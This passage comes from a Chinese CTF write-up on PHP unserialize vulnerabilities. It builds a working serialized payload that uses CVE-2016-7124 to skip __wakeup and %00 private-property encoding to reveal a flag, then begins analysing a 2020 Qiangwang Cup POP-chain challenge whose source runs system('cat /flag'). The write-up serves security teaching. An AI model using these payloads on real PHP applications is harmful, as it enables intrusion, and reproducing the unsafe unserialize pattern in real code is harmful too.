absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;</span>&gt;不愧是我！！！</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;</span>&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;position: absolute;bottom: 5%;width: 99%;&quot;</span>&gt;&lt;p align=<span class="string">&quot;center&quot;</span> style=<span class="string">&quot;font:italic 15px Georgia,serif;color:white;&quot;</span>&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script  src=<span class="string">&quot;index.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>先看index.php 首先包含了一个class.php , 变量select 通过get方法获取参数，并将select反序列化的结果赋值给res.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们再来看下class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到定义了一个类name，2个私有权限的变量（为什么要提这个呢？涉及到后面的反序列化的特殊构造），3个方法，注意下面这一陀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们想要输出flag的话，需要满足这个if条件，以及要绕过password要弱等于100 那一坨的限制，不然会被die，如果仔细看的话，我们还需要绕过下面这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>____wakeup函数里会把我们的username赋值为guest。因为__wakeup函数是在__destruct函数之前运行的，所以我们要绕过它, 那就涉及到这个__wakeup()绕过方法漏洞（CVE-2016-7124）</p><br><h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="keyword">new</span> <span class="title class_">Name</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$name</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意这里我们只是生成了反序列化，还没有去绕过__wakeup()魔法函数</p><p>前面也说了 在特定php版本存在：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，我们这里的真实的属性个数2个，那我们将2 改为3 即可成功绕过 ____wakeup的执行</p></blockquote><p>将上面生成的反序列化的2改为3：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/11/zYLm1.png" data-caption="zYLm1.png"><img src="https://i.imgtg.com/2022/05/11/zYLm1.png" alt="zYLm1.png"></a></p><p>看到这，你是否想要XXXXXX?</p><p>WTF??????</p><p>你细节想想为什么？这其实是涉及到了反序列化过程中的属性权限格式问题了，这个问题这里就不讲了，可以去看看这篇文章，有很仔细的讲过，<a href="https://imhopper.github.io/2022/05/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#PHP%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98">———&gt;&gt;&gt;&gt;&gt;  记一次再学习，深入理解 PHP反序列化漏洞学习和总结</a></p><p>那我们修改完的权限格式后变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>再去传参数：</p><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/11/zYEVI.png" data-caption="zYEVI.png"><img src="https://i.imgtg.com/2022/05/11/zYEVI.png" alt="zYEVI.png"></a></p><blockquote><p>这个题分析的比较细，但还是觉得题，不再于去讲速度，而是要看到后面的知识点，这才是最重要的，网上有很多的复现，但很多都是copy - &gt; copy , 我们还是知其所以然</p></blockquote><br><h2 id="2020强网杯”WEB辅助”POP链的构造"><a href="#2020强网杯”WEB辅助”POP链的构造" class="headerlink" title="2020强网杯”WEB辅助”POP链的构造"></a>2020强网杯”WEB辅助”POP链的构造</h2><blockquote><p>其实上面一个题，是为这道题做的准备。。。</p></blockquote><p>题目给了源码，我们直接进行代码分析，这里已经给每个php文件做了些注释，方便后期构造POP链，一共4个文件分别是：</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义类player</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="comment">// 对象创建时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$admin</span> = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin = <span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回类对象里 admin变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义类 topsolo</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当对象创建时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;Riven&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法TP</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">gettype</span>(<span class="variable">$this</span>-&gt;name) === <span class="string">&quot;function&quot;</span> <span class="keyword">or</span> <span class="title function_ invoke__">gettype</span>(<span class="variable">$this</span>-&gt;name) === <span class="string">&quot;object&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">            <span class="variable">$name</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当一个对象销毁时调用，执行对象TP的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">TP</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义类midsolo</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当一个对象创建时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当使用unserialize时触发，如果里面的name不等于 ‘Yasuo’,就赋值为‘Yasuo’ ，并输出打印值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name !== <span class="string">&#x27;Yasuo&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;Yasuo&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No Yasuo! No Soul!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当脚本尝试将对象调用为函数时触发，执行对象里的Gank方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Gank</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Gank方法，当对象里的name的值是‘Yasuo’，输出 Are you orphan? 否者输出 Must Be Yasuo!</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$this</span>-&gt;name, <span class="string">&#x27;Yasuo&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Are you orphan?\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Must Be Yasuo!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义类 jungle</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当一个对象创建时调用，对象里的name赋值为 &quot;Lee Sin&quot;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&quot;Lee Sin&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义KS方法，获取flag</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把类当作字符串使用时触发，执行对象里的KS方法，并返回空</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">KS</span>();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0*\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0*\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;name&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Name Pass\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>play.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$player</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">check</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;caches/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>])))));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$player</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$player</span>-&gt;<span class="title function_ invoke__">get_admin</span>() === <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;FPX Champion\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The Shy unstoppable\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span 